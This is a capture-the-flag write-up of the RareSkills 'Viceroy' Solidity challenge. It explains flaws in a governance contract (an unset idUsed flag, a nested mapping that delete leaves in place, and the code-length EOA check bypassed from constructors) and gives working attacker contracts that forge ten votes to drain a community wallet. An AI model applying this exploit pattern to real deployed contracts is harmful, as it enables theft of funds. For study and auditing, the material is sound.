### RareSkills Riddles: Viceroy

The objective of this is to drain the community wallet of all Ether and transfer that to the attacker wallet.  There are three contracts in the Solidity file.  

1. ```OligarchyNFT``` this is an ERC721 NFT where the constructor mints 1 NFT to the attacker. 
2. ```Governance``` this is the main contract where the Community Wallet gets created, and funded.  Proposals can be created here and voted on.  Each proposal needs 10 votes to be executed.  In order to vote on a prospal a contract can call ```voteOnProposal()``` each address has to be an approved address and can only vote one time.  In order to approve an address a viceroy need to call approveVoter().  Each viceroy can only approve five voters, however the viceroy and be deposed and a new viceroy can be appointed, also the viceroy cannot be a contract only and EOA.  Lastly the voter cannot be contracts but only EOAs.  
3. ```CommunityWallet``` when this contract is created the governance address is set.  The governance address can call ```exec(address target, bytes data, uint256 value)``` which will send ether to an another address and perform a function call.   In the ```Governance``` constructor the community wallet owner is assigned to the Governance contract.  

Transfering funds out of the CommunityWallet appears to be possible only by having the Governance contract call ```exec()```, so it appears we need to figure out how to get 10 votes.  

One first glance this appears to be similar to the AssignVotes challenge, however in this challenge the assigners and voters need to be EOAs.  A brute force solution which would require 12 addresses is to appoint two addresses as viceroys then have each approve five addresses to vote.  

Another thing to note is the ```deposeViceroy()``` method uses an incorrect method of removing mappings.   

```Java
    function appointViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(!idUsed[id], "already appointed a viceroy");
        require(viceroy.code.length == 0, "only EOA");

        viceroys[viceroy].appointedBy = id;
        viceroys[viceroy].numAppointments = 5;
    }

    function deposeViceroy(address viceroy, uint256 id) external {
        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
        require(
            viceroys[viceroy].appointedBy == id,
            "only the appointer can depose"
        );

        idUsed[id] = false;
        delete viceroys[viceroy];
    }
```

Solidity does not delete mappings when then ```delete``` keyword is used.  The last line in ```deposeVicerory()``` should not work and we should be able to take advangate of that.  Something else of note is that an oligarch can appoint as many viceroys as he wants.  The second ```require()``` statement in ```appointViceroy()``` checks idUsed but this is never set, so we can appoint many viceroys at the same time.  How can we take advantage of this?  Let's look at approveVoter().  

```Java
    function approveVoter(address voter) external {
        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
        require(voter != msg.sender, "cannot add yourself");
        require(
            !viceroys[msg.sender].approvedVoter[voter],
            "cannot add same voter twice"
        );
        require(
            viceroys[msg.sender].numAppointments > 0,
            "no more appointments"
        );
        require(voter.code.length == 0, "only EOA");

        viceroys[msg.sender].numAppointments -= 1;
        viceroys[msg.sender].approvedVoter[voter] = true;
    }
```

A viceroy is needed to call ```approveVoter()```, and they can only add EOAs one time for each viceroy.  One thing to note here is that the voters are tracked by viceroy, and he have previously determined that we can have more than one active viceroy at at time.  So one voter can be approved by multiple viceroys at the same time.  However there is an ```alreadyVoted[msg.sender]``` check in ```voteOnProposal()``` so we could only vote one time.    

This contract checks tha the viceroy and voters are not contracts using the following code: ```require(voter.code.length == 0, "only EOA");```.  If the contract is being constructed then the code length will be 0.  So we can actually get around this check by putting everything in the contract's constructor.  

We can now construct a contract that will attack this by: 

1. creating two viceroys
2. for each viceroy spwan five voters

Code to do this is given below.  

```Java
contract ViceroyAttacker {
    Governance governance;
    address public proposalAddress;
    uint256 public proposalID;

    function attack(address _governanceAddress) external {
        governance = Governance(_governanceAddress);

        // create two viceroys
        Viceroy viceroy0 = new Viceroy(_governanceAddress);
        viceroy0.spawnVoters(); // for each viceroy create five voters

        Viceroy viceroy1 = new Viceroy(_governanceAddress);
        viceroy1.spawnVoters();

        // execute proposal
        governance.executeProposal(proposalID);
    }

    function appointMe() external {
        governance.appointViceroy(msg.sender, 1);
    }

    function setProposalAddress(address _add, uint256 _id) external {
        proposalAddress = _add;
        proposalID = _id;
    }

    receive() external payable {}
}

contract Viceroy {
    Governance immutable governance;
    ViceroyAttacker immutable attacker;
    bytes proposal;

    constructor(address _governance) {
        governance = Governance(_governance);
        attacker = ViceroyAttacker(payable(msg.sender));
        proposal = abi.encodeCall(CommunityWallet.exec, (msg.sender, bytes(""), 10000000000000000000));

        attacker.appointMe();
    }

    function spawnVoters() external {
        // if the proposal has not yet been created, do that
        if (attacker.proposalAddress() == address(0)) {
            governance.createProposal(address(this), proposal);
            uint256 proposalID = uint256(keccak256(proposal));
            attacker.setProposalAddress(address(this), proposalID);
        }

        for (uint256 i; i < 5; i++) {
            // spawn voter
            new Voter(address(governance), attacker.proposalID());
        }
    }

    // approve voter
    function approveMe() external {
        governance.approveVoter(msg.sender);
    }
}

contract Voter {
    constructor(address _governance, uint256 _proposalID) {
        // get approved to vote
        Viceroy(msg.sender).approveMe();
        // voteOnProposal(uint256 proposal,bool inFavor,address viceroy)
        Governance(_governance).voteOnProposal(_proposalID, true, msg.sender);
    }
}
```
